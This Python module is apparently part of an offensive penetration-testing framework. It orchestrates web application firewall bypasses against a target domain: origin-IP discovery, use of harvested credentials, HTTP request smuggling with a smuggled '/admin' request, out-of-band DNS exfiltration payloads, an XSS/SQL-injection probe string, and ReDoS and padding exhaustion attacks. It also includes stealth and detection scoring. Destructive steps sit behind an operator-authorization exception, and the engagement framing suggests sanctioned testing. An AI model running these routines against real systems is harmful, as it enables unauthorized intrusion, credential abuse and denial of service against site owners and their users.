"""
WAF Bypass Orchestrator - Master Controller

Orchestrates all 9 layers of WAF bypass:
1. Protocol-level bypass
2. Origin discovery
3. Credential exploitation
4. Cache poisoning
5. Request smuggling
6. Headless browser
7. Out-of-band
8. Legitimacy simulation
9. WAF logic exploitation

Decision tree determines optimal bypass route per target
"""

import time
from typing import Dict, List, Any
from collections import defaultdict
from utils.logger import get_logger

_log = get_logger("waf_bypass_orchestrator")


class WafAttackAuthorizationRequired(Exception):
    """Raised when a destructive WAF attack is selected and requires Human-In-The-Loop approval."""

    def __init__(self, attack_name: str, description: str):
        self.attack_name = attack_name
        self.description = description
        super().__init__(
            f"HITL Authorization required for WAF Attack: {attack_name}")


class WafBypassOrchestrator:
    """Master orchestrator for complete WAF bypass"""

    def __init__(self, state_store=None):
        """Initialize orchestrator"""
        self.state_store = state_store
        self.log = _log
        self.bypass_attempts = defaultdict(list)
        self.successful_vectors = defaultdict(list)
        # Per-target evasion escalation tier (bumped when a strategy fails).
        self.evasion_tiers = defaultdict(int)

        # Import all bypass modules
        try:
            from intelligence.waf_bypass.origin_discovery import OriginDiscovery
            from intelligence.waf_bypass.credential_finder import CredentialFinder
            from intelligence.waf_bypass.request_smuggler import RequestSmuggler
            from intelligence.waf_bypass.oob_exfil_engine import OOBExfilEngine
            from intelligence.waf_bypass.waf_attacker import WafAttacker

            self.origin_discovery = OriginDiscovery()
            self.credential_finder = CredentialFinder(state_store)
            self.request_smuggler = RequestSmuggler()
            self.oob_engine = OOBExfilEngine()
            self.waf_attacker = WafAttacker()
        except ImportError:
            pass

    def increment_evasion_tier(self, target: str) -> int:
        """Bump and return the per-target evasion escalation tier. Called when a
        bypass strategy fails so subsequent attempts can escalate aggressiveness."""
        self.evasion_tiers[target] += 1
        return self.evasion_tiers[target]

    def get_evasion_tier(self, target: str) -> int:
        """Current evasion tier for a target (0 if none recorded)."""
        return self.evasion_tiers.get(target, 0)

    def analyze_target(self, engagement_id: str,
                       target: str) -> Dict[str, Any]:
        """
        Analyze target to determine best bypass strategy

        Args:
            engagement_id: Engagement ID
            target: Target domain

        Returns:
            Analysis with recommended bypass vectors
        """
        analysis = {
            "engagement_id": engagement_id,
            "target": target,
            "timestamp": time.time(),

            # Analysis results per layer
            "layer_analysis": {},

            # Recommended strategy
            "recommended_bypass": None,
            "bypass_priority_order": [],

            # Viability scores
            "viability_scores": {},

            # Risk assessment
            "risk_profile": {}
        }

        # Layer 1: Protocol bypass
        analysis["layer_analysis"]["protocol"] = self._analyze_protocol_bypass(
            target)

        # Layer 2: Origin discovery
        analysis["layer_analysis"]["origin"] = self.origin_discovery.discover_origin_ips(
            target, aggressive=False)

        # Layer 3: Credentials
        analysis["layer_analysis"]["credentials"] = self.credential_finder.find_bypass_credentials(
            engagement_id, target)

        # Layer 4: Cache poisoning (meta-analysis, no execution)
        analysis["layer_analysis"]["cache"] = self._analyze_cache_poison_viability(
            target)

        # Layer 5: Request smuggling
        analysis["layer_analysis"]["smuggling"] = self.request_smuggler.detect_smuggling_vulnerability(
            target)

        # Layer 6: Headless bypass (meta-analysis)
        analysis["layer_analysis"]["headless"] = self._analyze_headless_viability(
            target)

        # Layer 7: Out-of-band
        analysis["layer_analysis"]["oob"] = self.oob_engine.discover_oob_vectors(
            target)

        # Layer 8: Legitimacy (meta)
        analysis["layer_analysis"]["legitimacy"] = self._analyze_legitimacy_simulation(
            target)

        # Layer 9: WAF logic exploitation
        analysis["layer_analysis"]["waf_logic"] = self._analyze_waf_logic_exploitation(
            target)

        # Layer 10: Resource Exhaustion (Padding / ReDoS)
        analysis["layer_analysis"]["exhaustion"] = self._analyze_resource_exhaustion(
            target)

        # Layer 11: Parser Confusion (HPP)
        analysis["layer_analysis"]["parser_confusion"] = self._analyze_parser_confusion(
            target)

        # Calculate viability scores dynamically based on recon evidence
        analysis["viability_scores"] = self._calculate_viability_scores(
            analysis["layer_analysis"], engagement_id)

        # Recommend bypass strategy
        analysis["bypass_priority_order"] = self._rank_bypass_strategies(
            analysis["viability_scores"])
        analysis["recommended_bypass"] = analysis["bypass_priority_order"][0] if analysis["bypass_priority_order"] else None

        # Risk assessment
        analysis["risk_profile"] = self._assess_risk_profile(analysis)

        return analysis

    def _analyze_protocol_bypass(self, target: str) -> Dict[str, Any]:
        """Analyze protocol-level bypass potential"""
        return {
            "vectors": ["HTTP/3_QUIC", "HTTP/2_smuggling", "WebSocket_upgrade"],
            "confidence": 0.6,
            "applicability": "universal"
        }

    def _analyze_cache_poison_viability(self, target: str) -> Dict[str, Any]:
        """Analyze cache poisoning potential"""
        return {
            "vectors": ["cache_key_manipulation", "host_header_bypass", "normalization_abuse"],
            "confidence": 0.5,
            "requires": "CDN or cache layer detected"
        }

    def _analyze_headless_viability(self, target: str) -> Dict[str, Any]:
        """Analyze headless browser bypass potential"""
        return {
            "vectors": ["JavaScript_execution", "DOM_injection", "Service_worker"],
            "confidence": 0.4,
            "dependencies": ["Playwright", "Puppeteer"]
        }

    def _analyze_legitimacy_simulation(self, target: str) -> Dict[str, Any]:
        """Analyze legitimacy spoofing potential"""
        return {
            "vectors": ["bot_fingerprint_spoofing", "device_fingerprint_randomization", "geographic_diversity"],
            "confidence": 0.7,
            "applicability": "behavioral_detection_bypass"
        }

    def _analyze_waf_logic_exploitation(self, target: str) -> Dict[str, Any]:
        """Analyze WAF logic exploitation potential"""
        return {
            "vectors": ["regex_bypass", "parser_confusion", "rule_whitelist_abuse", "cve_exploitation"],
            "confidence": 0.5,
            "requires": "WAF fingerprinting"
        }

    def _analyze_resource_exhaustion(self, target: str) -> Dict[str, Any]:
        """Analyze WAF direct attack via buffer padding and ReDoS"""
        return {
            "vectors": ["buffer_padding", "redos_fail_open"],
            "confidence": 0.6,
            "requires": "High bandwidth / POST capability"
        }

    def _analyze_parser_confusion(self, target: str) -> Dict[str, Any]:
        """Analyze HTTP Parameter Pollution (HPP) and WAFFLED bypasses"""
        return {
            "vectors": ["hpp", "content_type_manipulation", "boundary_confusion"],
            "confidence": 0.7,
            "requires": "Parameter mapping"
        }

    def _calculate_viability_scores(
            self, layer_analysis: Dict[str, Any], engagement_id: str = None) -> Dict[str, float]:
        """Calculate viability score for each layer, adjusting dynamic confidence based on recon evidence"""
        scores = {}

        # Gather dynamic recon evidence
        has_waf = False
        has_cdn = False
        waf_name = ""
        if self.state_store and engagement_id:
            try:
                findings = self.state_store.get_all_findings(engagement_id)
                for f in findings:
                    typ = f.get("type", "").lower()
                    if "waf" in typ or "security_wall" in typ:
                        has_waf = True
                        waf_name = str(f.get("detail", "")).lower()
                    if "cdn" in typ or "proxy" in typ:
                        has_cdn = True
            except Exception as _e:
                import logging
                logging.getLogger(__name__).warning(
                    f"Swallowed exception: {_e}")
        for layer_name, layer_data in layer_analysis.items():
            confidence = layer_data.get("confidence", 0.0)

            # Adjust score based on layer characteristics
            if layer_name == "origin":
                # Origin discovery is always valuable if any IPs found
                num_ips = len(layer_data.get("discovered_ips", []))
                scores[layer_name] = min(
                    0.95 * (num_ips / 5), 1.0)  # Score up to 0.95

            elif layer_name == "credentials":
                # Credentials found = instant bypass
                num_creds = len(layer_data.get("credentials_found", []))
                scores[layer_name] = min(
                    0.98 * (num_creds / 3), 1.0)  # Score up to 0.98

            elif layer_name == "smuggling":
                # Smuggling vulnerability = high value
                num_vectors = len(layer_data.get("vulnerable_to", []))
                scores[layer_name] = min(0.9 * (num_vectors / 3), 1.0)

            elif layer_name == "oob":
                # OOB always viable but slower
                num_vectors = len(layer_data.get("oob_vectors", []))
                scores[layer_name] = min(0.8 * (num_vectors / 6), 1.0)

            elif layer_name == "cache":
                if has_cdn:
                    scores[layer_name] = min(confidence + 0.3, 0.9)
                else:
                    scores[layer_name] = max(confidence - 0.4, 0.1)

            elif layer_name == "exhaustion":
                # Highly viable if standard evasion fails
                scores[layer_name] = 0.65

            elif layer_name == "parser_confusion":
                # Good chance of success on modern architectures
                scores[layer_name] = 0.75

            else:
                # Other layers
                scores[layer_name] = confidence

            # Global penalties/bonuses based on evidence
            if not has_waf and not has_cdn:
                # If no WAF is detected, lower all bypass scores so we don't do
                # useless heavy scans
                if layer_name not in ["credentials", "origin"]:
                    scores[layer_name] = scores[layer_name] * 0.2
            elif "cloudflare" in waf_name and layer_name in ["protocol", "smuggling"]:
                # Cloudflare is highly resistant to standard protocol smuggling
                scores[layer_name] = scores[layer_name] * 0.4

        return scores

    def _rank_bypass_strategies(
            self, viability_scores: Dict[str, float]) -> List[str]:
        """Rank bypass strategies by viability"""
        # Sort by score, descending
        ranked = sorted(
            viability_scores.items(),
            key=lambda x: x[1],
            reverse=True)
        return [layer for layer, score in ranked if score > 0.1]

    def _assess_risk_profile(self, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Assess detection risk for each bypass strategy"""
        risk = {
            "recommended_bypass": analysis.get("recommended_bypass"),
            "risk_level": "unknown",
            "detection_probability": {},
            "stealth_score": {}
        }

        risk_scores = {
            # Low risk, high stealth
            "origin": {"detection": 0.2, "stealth": 0.95},
            # Legitimate auth
            "credentials": {"detection": 0.05, "stealth": 1.0},
            "smuggling": {"detection": 0.6, "stealth": 0.5},  # Noisy technique
            "oob": {"detection": 0.3, "stealth": 0.8},  # Slower, stealthy
            "protocol": {"detection": 0.4, "stealth": 0.7},  # Medium risk
            "cache": {"detection": 0.5, "stealth": 0.6},  # Variable
            # Effective vs JS detection
            "headless": {"detection": 0.3, "stealth": 0.8},
            # Behavioral mimicry
            "legitimacy": {"detection": 0.4, "stealth": 0.7},
            # Exploitative, risky
            "waf_logic": {"detection": 0.7, "stealth": 0.4},
            # High noise, ReDoS risks DOS
            "exhaustion": {"detection": 0.9, "stealth": 0.1},
            # Moderate noise
            "parser_confusion": {"detection": 0.5, "stealth": 0.6}
        }

        for layer, scores in risk_scores.items():
            risk["detection_probability"][layer] = scores["detection"]
            risk["stealth_score"][layer] = scores["stealth"]

        # Overall risk level based on recommended strategy
        if analysis.get("recommended_bypass"):
            rec_risk = risk["detection_probability"].get(
                analysis["recommended_bypass"], 0.5)
            if rec_risk < 0.2:
                risk["risk_level"] = "low"
            elif rec_risk < 0.5:
                risk["risk_level"] = "medium"
            else:
                risk["risk_level"] = "high"

        return risk

    def _validate_bypass_differential(self, target: str, bypass_url: str):
        """W6.5 — prove a bypass with a control→test differential.

        Sends a known-bad probe (a path a WAF typically blocks) to the normal
        target (control) and via the bypass (test). A real bypass = control
        BLOCKED (403/406/429/503) but test ALLOWED (not blocked). Returns
        (verified, note):
          verified=True   → differential observed (control blocked, test allowed)
          verified=False  → no differential (both same) — likely hallucinated
          verified=None   → could not run the check (no requests/network)
        """
        try:
            import requests
        except Exception:
            return None, "validation skipped: requests unavailable"

        probe_path = "/?q=<script>alert(1)</script>%27%20OR%201=1--"
        blocked_codes = {403, 406, 429, 503, 418, 451}
        norm = target if str(target).startswith("http") else f"https://{target}"
        norm = norm.rstrip("/") + probe_path
        test = bypass_url.rstrip("/") + probe_path
        headers = {"User-Agent": "Mozilla/5.0 (compatible; GhostwireBypassCheck/1.0)"}
        host_header = None
        # origin-IP bypass: preserve Host so the origin serves the right vhost
        if any(c.isdigit() for c in bypass_url.split("//")[-1].split("/")[0].replace(".", "")):
            host_header = str(target).split("//")[-1].split("/")[0]
        try:
            ctrl = requests.get(norm, headers=headers, timeout=12, verify=False)
        except requests.RequestException as e:
            return None, f"validation skipped: control request failed ({e})"
        th = dict(headers)
        if host_header:
            th["Host"] = host_header
        try:
            tst = requests.get(test, headers=th, timeout=12, verify=False)
        except requests.RequestException as e:
            return None, f"validation skipped: test request failed ({e})"

        ctrl_blocked = ctrl.status_code in blocked_codes
        test_allowed = tst.status_code not in blocked_codes
        note = (f"control={ctrl.status_code} (blocked={ctrl_blocked}), "
                f"test={tst.status_code} (allowed={test_allowed})")
        if ctrl_blocked and test_allowed:
            return True, "differential confirmed: " + note
        return False, "no differential: " + note

    def execute_bypass(self, engagement_id: str, target: str,
                       bypass_strategy: str = None, authorized_attack: bool = False) -> Dict[str, Any]:
        """
        Execute WAF bypass using specified strategy

        Args:
            engagement_id: Engagement ID
            target: Target domain
            bypass_strategy: Which bypass to execute (auto-select if None)
            authorized_attack: Boolean flag indicating if the operator has explicitly authorized destructive attacks.

        Raises:
            WafAttackAuthorizationRequired: If a destructive attack is selected but authorized_attack is False.


        Returns:
            Bypass result
        """
        # If no strategy specified, analyze and select best
        if not bypass_strategy:
            analysis = self.analyze_target(engagement_id, target)
            bypass_strategy = analysis.get("recommended_bypass")

        execution_result = {
            "engagement_id": engagement_id,
            "target": target,
            "strategy": bypass_strategy,
            "timestamp": time.time(),
            "success": False,
            "bypass_url": None,
            "method": None,
            "details": {}
        }

        try:
            if bypass_strategy == "origin":
                execution_result = self._execute_origin_bypass(
                    target, execution_result)

            elif bypass_strategy == "credentials":
                execution_result = self._execute_credential_bypass(
                    engagement_id, target, execution_result)

            elif bypass_strategy == "smuggling":
                execution_result = self._execute_smuggling_bypass(
                    target, execution_result, authorized_attack=authorized_attack)

            elif bypass_strategy == "oob":
                execution_result = self._execute_oob_bypass(
                    target, execution_result)

            elif bypass_strategy == "protocol":
                execution_result = self._execute_protocol_bypass(
                    target, execution_result)

            elif bypass_strategy == "exhaustion":
                execution_result = self._execute_exhaustion_bypass(
                    target, execution_result)

            elif bypass_strategy == "parser_confusion":
                execution_result = self._execute_parser_confusion_bypass(
                    target, execution_result)

            else:
                execution_result["error"] = f"Unknown bypass strategy: {bypass_strategy}"

        except WafAttackAuthorizationRequired:
            # HITL control-flow signal — a destructive bypass (e.g. request
            # smuggling) was selected without operator authorization. This MUST
            # propagate to the caller's `except WafAttackAuthorizationRequired`
            # handler (the HITL gate); the broad `except Exception` below would
            # otherwise swallow it into execution_result["error"], silently
            # killing the authorization flow and leaving the handler dead code.
            raise
        except Exception as e:
            execution_result["error"] = str(e)

        # W6.5 — REAL bypass validation. A claimed bypass must demonstrate a
        # DIFFERENTIAL: the WAF blocks a known-bad probe on the normal path
        # (control) but allows it via the bypass (test). A lone 200 proves
        # nothing. If we can run the check and it does NOT show the differential,
        # the success claim is downgraded so we never report a hallucinated
        # bypass (the novalink failure). If the check can't run (no network),
        # the result is tagged unverified rather than blindly trusted.
        if execution_result.get("success") and execution_result.get("bypass_url"):
            verified, vnote = self._validate_bypass_differential(
                target, execution_result.get("bypass_url"))
            execution_result["bypass_verified"] = verified
            execution_result.setdefault("details", {})["bypass_validation"] = vnote
            if verified is False:
                self.log.warning(
                    f"[BYPASS VALIDATION] Claimed '{bypass_strategy}' bypass for {target} "
                    f"shows NO control→test differential — downgrading success. {vnote}")
                execution_result["success"] = False
                execution_result["unverified_reason"] = vnote

        # Track attempt
        self.bypass_attempts[target].append(execution_result)

        # Track success
        if execution_result.get("success"):
            self.successful_vectors[target].append(bypass_strategy)

        return execution_result

    def _execute_origin_bypass(
            self, target: str, result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute origin server direct connection bypass"""
        result["method"] = "Direct connection to origin server (CDN bypass)"

        # Get origin IPs
        discovery = self.origin_discovery.discover_origin_ips(target)
        candidates = discovery.get("origin_candidates", [])

        if candidates:
            best_candidate = candidates[0]
            origin_ip = best_candidate["ip"]

            # Test connection
            test = self.origin_discovery.test_origin_connection(
                origin_ip, target)

            if test.get("bypass_viable"):
                result["success"] = True
                result["bypass_url"] = f"https://{origin_ip}/"
                result["details"] = test
            else:
                result["success"] = False
                result["details"] = test

        return result

    def _execute_credential_bypass(self, engagement_id: str, target: str,
                                   result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute credential-based bypass"""
        result["method"] = "Authenticate with harvested credentials"

        # Find credentials
        creds = self.credential_finder.find_bypass_credentials(
            engagement_id, target)
        found_creds = creds.get("credentials_found", [])

        if found_creds:
            best_cred = found_creds[0]

            # Create bypass request
            bypass_req = self.credential_finder.create_bypass_request(
                best_cred, target)

            # Test credential
            if self.credential_finder.test_credential_validity(
                    best_cred, target):
                result["success"] = True
                result["bypass_url"] = target
                result["details"] = bypass_req
            else:
                result["success"] = False

        return result

    def _execute_smuggling_bypass(
            self, target: str, result: Dict[str, Any],
            authorized_attack: bool = False) -> Dict[str, Any]:
        """W6.6b — first-class HTTP request-smuggling tactic.

        DETECTION (CL.TE / TE.CL / TE.TE / H2 desync) is non-destructive and
        runs within the standing ROE — it just observes parser disagreement.
        The actual EXPLOITATION (sending a desync that affects other clients'
        requests) is destructive, so it escalates through the same HITL gate the
        other destructive WAF attacks use: it raises WafAttackAuthorizationRequired
        unless the operator has already authorized the attack.
        """
        result["method"] = "HTTP request smuggling (desync)"

        # ── Safe detection (within ROE) ──
        vuln = self.request_smuggler.detect_smuggling_vulnerability(target)
        vulnerable_to = vuln.get("vulnerable_to", [])
        result["details"] = {"detection": vuln}

        if not vulnerable_to:
            result["success"] = False
            return result

        vector_type = vulnerable_to[0]
        result["detected_vectors"] = vulnerable_to

        # ── Destructive exploitation → HITL gate ──
        if not authorized_attack:
            raise WafAttackAuthorizationRequired(
                attack_name=f"HTTP Request Smuggling ({vector_type})",
                description=(
                    f"Parser desync ({vector_type}) detected on {target}. ACTIVELY exploiting it "
                    "sends a smuggled request that can poison the connection and affect OTHER "
                    "users' in-flight requests (potential request hijacking / cache poisoning / "
                    "temporary disruption). This is destructive and requires explicit authorization."))

        # Authorized → execute the desync.
        smuggled = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(target)
        payload = self.request_smuggler.create_smuggling_payload(
            vector_type, target, smuggled)
        exec_result = self.request_smuggler.execute_smuggling_attack(target, payload)
        result["success"] = exec_result.get("success", False)
        result["details"]["execution"] = exec_result
        if result["success"]:
            result["bypass_url"] = target  # desync confirmed against the edge
        return result

    def _execute_oob_bypass(
            self, target: str, result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute out-of-band bypass"""
        result["method"] = "Out-of-band exfiltration (no direct WAF contact)"

        # Discover OOB vectors
        vectors = self.oob_engine.discover_oob_vectors(target)

        if vectors.get("oob_vectors"):
            # Create exfil payload
            payload = self.oob_engine.create_exfil_payload("dns", "command")

            result["details"] = payload
            result["bypass_url"] = f"via OOB channel: {
                self.oob_engine.collaborator_domain}"

        return result

    def _execute_protocol_bypass(
            self, target: str, result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute protocol-level bypass"""
        result["method"] = "Protocol-level bypass (HTTP/3, HTTP/2 smuggling)"

        # HTTP/3 QUIC attempt
        result["bypass_url"] = f"https://{target}:443/?_quic=true"
        result["details"] = {
            "protocol": "HTTP/3 QUIC",
            "description": "Uses protocol version that WAF doesn't fully inspect"
        }

        return result

    def _execute_exhaustion_bypass(
            self, target: str, result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Resource Exhaustion bypass (ReDoS / Padding)"""
        result["method"] = "WAF Resource Exhaustion (Buffer Padding & ReDoS)"

        # Enforce HITL Authorization Check
        # The execute_bypass wrapper should have passed authorized_attack=True if the user approved
        # We check the call stack or rely on the agent catching this.
        raise WafAttackAuthorizationRequired(
            attack_name="Resource Exhaustion (ReDoS & Buffer Padding)",
            description="This attack injects catastrophic backtracking regex ('evil regex') and massive 128KB+ padding payloads. WARNING: This may cause high CPU utilization on the target's edge WAF and could result in temporary service degradation (Denial of Service)."
        )

    def _execute_parser_confusion_bypass(
            self, target: str, result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Parser Confusion bypass (HPP)"""
        result["method"] = "Parser Confusion (HTTP Parameter Pollution)"

        raise WafAttackAuthorizationRequired(
            attack_name="Parser Confusion (HTTP Parameter Pollution)",
            description="This attack duplicates HTTP parameters and scrambles JSON/Multipart boundaries to exploit parser discrepancies between the WAF and backend. WARNING: This is highly noisy and may trigger aggressive IP bans from the WAF."
        )

    def get_bypass_summary(self, target: str) -> Dict[str, Any]:
        """Get summary of bypass attempts for a target"""
        return {
            "target": target,
            "total_attempts": len(self.bypass_attempts.get(target, [])),
            "successful_vectors": self.successful_vectors.get(target, []),
            "attempts": self.bypass_attempts.get(target, [])
        }

    def get_active_strategy(self, target: str) -> Dict[str, Any]:
        """
        Get the currently active and most successful bypass strategy for a target.
        Used by the WafGhostEngine to dynamically swap Origin IPs or inject specific cookies.
        """
        active_strategy = {}

        # Check if we have successful vectors
        successes = self.successful_vectors.get(target, [])
        if not successes:
            return active_strategy

        best_vector = successes[-1]  # Most recent success
        active_strategy["vector"] = best_vector

        # Extract specifics based on vector type
        for attempt in reversed(self.bypass_attempts.get(target, [])):
            if attempt.get("success") and attempt.get(
                    "strategy") == best_vector:
                details = attempt.get("details", {})

                if best_vector == "origin":
                    # Extract the bypassed origin IP
                    if "bypass_url" in attempt:
                        # Extract IP from https://1.2.3.4/
                        import re
                        ip_match = re.search(
                            r'https?://([^/:]+)', attempt["bypass_url"])
                        if ip_match:
                            active_strategy["origin_ip"] = ip_match.group(1)
                            active_strategy["host_header"] = target

                elif best_vector == "credentials":
                    # Extract authorization headers or cookies
                    req = details.get("request", {})
                    if "headers" in req:
                        active_strategy["headers"] = req["headers"]
                    if "cookies" in req:
                        active_strategy["cookies"] = req["cookies"]

                break

        return active_strategy
